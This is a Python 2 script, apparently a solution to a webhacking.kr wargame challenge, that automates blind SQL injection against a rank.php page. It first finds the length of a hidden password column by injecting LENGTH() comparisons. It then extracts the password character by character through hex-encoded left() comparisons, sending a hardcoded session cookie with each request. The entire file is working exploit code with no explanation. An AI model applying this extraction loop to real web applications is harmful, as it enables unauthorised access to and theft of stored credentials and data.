#coding:utf-8
from socket import *
from urllib2 import *
from socket import *
from string import *
import urllib2, re, slist


# 세션 값
SESSION = "84a6460d0bc930852330e5e1964c5c0d"

#범위§
code = slist.flist()

# 변수
pw_len = 0
pw = ""



for i in range(0,100):
	req = urllib2.Request("http://webhacking.kr/challenge/web/web-31/rank.php?score=0%20and%20LENGTH(pAsSw0RdzzzZ)%20=%20"+str(i))
	req.add_header("Cookie", "PHPSESSID=%s" % SESSION )
	res = urllib2.urlopen(req).read()

	if res.find("localhost // 0") != -1:
		pw_len = int(i)
		break

print "pAsSw0RdzzzZ length : %s" % pw_len

for i in range(1,(pw_len+1)):
	for j in code:
		hexj = j.encode('hex')
		req = urllib2.Request("http://webhacking.kr/challenge/web/web-31/rank.php?score=0%20and%20left(pAsSw0RdzzzZ,"+str(i)+")%20=%200x"+str(pw + hexj))
		req.add_header("Cookie", "PHPSESSID=%s" % SESSION )
		res = urllib2.urlopen(req).read()


		if res.find("localhost // 0") != -1:
			pw += hexj
			print pw
			break


print "pAsSw0RdzzzZ : %s" % str(pw.decode('hex'))
